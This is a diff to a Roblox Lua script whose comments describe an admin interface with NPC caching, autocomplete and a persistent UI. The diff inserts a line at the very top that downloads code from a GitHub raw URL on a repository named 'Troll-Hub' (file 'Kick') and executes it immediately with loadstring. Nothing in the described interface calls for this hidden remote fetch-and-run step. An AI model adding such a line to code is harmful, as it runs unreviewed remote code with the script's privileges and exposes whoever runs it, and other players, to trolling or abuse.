@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/Kick"))()
+
+
 -- Admin Interface completo final
 -- Incluye: cache de NPCs, autocompletado animado, botones scrollables, navegación con teclado, T objetive arreglado,
 -- splash/intro que solo oculta la UI temporalmente y hace la interfaz persistente tras respawn.
